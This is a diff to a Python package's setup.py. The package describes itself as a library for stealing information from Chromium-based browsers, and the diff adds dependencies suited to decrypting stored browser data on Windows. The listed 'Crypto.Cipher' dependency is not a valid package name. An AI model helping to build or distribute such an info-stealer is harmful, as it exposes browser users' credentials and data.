@@ -9,4 +9,5 @@ setup(
     author_email="josakko@protonmail.com",
     description="Python library for stealing different info from chromium based browsers",
     packages=find_packages(),
+    install_requires=["Crypto.Cipher", "pywin32"],
 )
